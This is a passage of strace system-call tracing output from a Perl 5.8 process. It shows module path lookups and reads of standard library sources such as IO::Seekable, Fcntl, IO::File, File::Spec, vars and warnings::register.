12010 20:22:35.198059 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
12010 20:22:35.198190 stat64("/etc/perl/Fcntl.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.198218 stat64("/etc/perl/Fcntl.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.198232 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.198245 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.198259 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.198271 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.198286 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.198298 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.198315 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.198337 stat64("/usr/share/perl5/Fcntl.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.198352 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.198364 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
12010 20:22:35.198386 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.198400 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.198411 _llseek(8, 0, [0], SEEK_CUR) = 0
12010 20:22:35.198431 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
12010 20:22:35.198778 brk(0x81f7000)    = 0x81f7000
12010 20:22:35.355182 read(8, "", 4096) = 0
12010 20:22:35.355222 close(8)          = 0
12010 20:22:35.355305 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
12010 20:22:35.355338 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12010 20:22:35.355368 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
12010 20:22:35.355436 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
12010 20:22:35.355542 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
12010 20:22:35.355560 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d61000
12010 20:22:35.355575 mmap2(0xb7d64000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d64000
12010 20:22:35.355591 close(8)          = 0
12010 20:22:35.355811 read(6,  <unfinished ...>
12008 20:22:35.355839 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12008 20:22:35.355863 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12008 20:22:35.355926 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12008 20:22:35.355954 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12008 20:22:35.355983 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
12008 20:22:35.355998 waitpid(-1,  <unfinished ...>
12010 20:22:35.405496 <... read resumed> "", 4096) = 0
12010 20:22:35.445776 close(6)          = 0
12010 20:22:35.445863 stat64("/etc/perl/IO/File.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.445882 stat64("/etc/perl/IO/File.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.445896 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.445910 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.445924 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.445937 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.445952 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.445964 stat64("/usr/lib/perl5/IO/File.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.445977 stat64("/usr/share/perl5/IO/File.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.445990 stat64("/usr/share/perl5/IO/File.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.446012 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.446026 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
12010 20:22:35.446049 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
12010 20:22:35.446065 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79ee8) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.446079 _llseek(6, 0, [0], SEEK_CUR) = 0
12010 20:22:35.446099 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
12010 20:22:35.446439 stat64("/etc/perl/File/Spec.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446456 stat64("/etc/perl/File/Spec.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446470 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446483 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446497 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446511 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446525 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446537 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446550 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446564 stat64("/usr/share/perl5/File/Spec.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446577 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446591 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446605 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446619 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
12010 20:22:35.446640 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.446659 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.446671 _llseek(8, 0, [0], SEEK_CUR) = 0
12010 20:22:35.446693 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
12010 20:22:35.446828 stat64("/etc/perl/vars.pmc", 0xbfc7986c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446843 stat64("/etc/perl/vars.pm", 0xbfc7977c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446857 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfc7986c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446869 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfc7977c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446883 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfc7986c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446896 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfc7977c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446911 stat64("/usr/lib/perl5/vars.pmc", 0xbfc7986c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446924 stat64("/usr/lib/perl5/vars.pm", 0xbfc7977c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446937 stat64("/usr/share/perl5/vars.pmc", 0xbfc7986c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446949 stat64("/usr/share/perl5/vars.pm", 0xbfc7977c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446963 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfc7986c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446975 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfc7977c) = -1 ENOENT (No such file or directory)
12010 20:22:35.446989 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfc7986c) = -1 ENOENT (No such file or directory)
12010 20:22:35.447001 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
12010 20:22:35.447023 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
12010 20:22:35.447037 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79588) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.447048 _llseek(10, 0, [0], SEEK_CUR) = 0
12010 20:22:35.447065 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
12010 20:22:35.447185 stat64("/etc/perl/warnings/register.pmc", 0xbfc793bc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447200 stat64("/etc/perl/warnings/register.pm", 0xbfc792cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447225 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfc793bc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447266 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfc792cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447282 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfc793bc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447310 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfc792cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447325 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfc793bc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447337 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfc792cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447351 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfc793bc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447364 stat64("/usr/share/perl5/warnings/register.pm", 0xbfc792cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447378 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfc793bc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447392 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfc792cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447406 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfc793bc) = -1 ENOENT (No such file or directory)
12010 20:22:35.447420 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
12010 20:22:35.447442 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
12010 20:22:35.447457 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc790d8) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.447468 _llseek(11, 0, [0], SEEK_CUR) = 0
12010 20:22:35.447487 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
12010 20:22:35.447639 read(11, "", 4096) = 0
12010 20:22:35.447653 close(11)         = 0
12010 20:22:35.447915 _llseek(10, 1148, [1148], SEEK_SET) = 0
12010 20:22:35.447932 _llseek(10, 0, [1148], SEEK_CUR) = 0
12010 20:22:35.447943 close(10)         = 0
12010 20:22:35.448014 _llseek(8, 594, [594], SEEK_SET) = 0
12010 20:22:35.448029 _llseek(8, 0, [594], SEEK_CUR) = 0
12010 20:22:35.448039 close(8)          = 0
12010 20:22:35.448073 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448089 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448103 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448117 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448131 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448145 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448160 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448177 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448191 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448288 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448332 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448346 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448375 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.448389 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
12010 20:22:35.448411 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.448427 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.448439 _llseek(8, 0, [0], SEEK_CUR) = 0
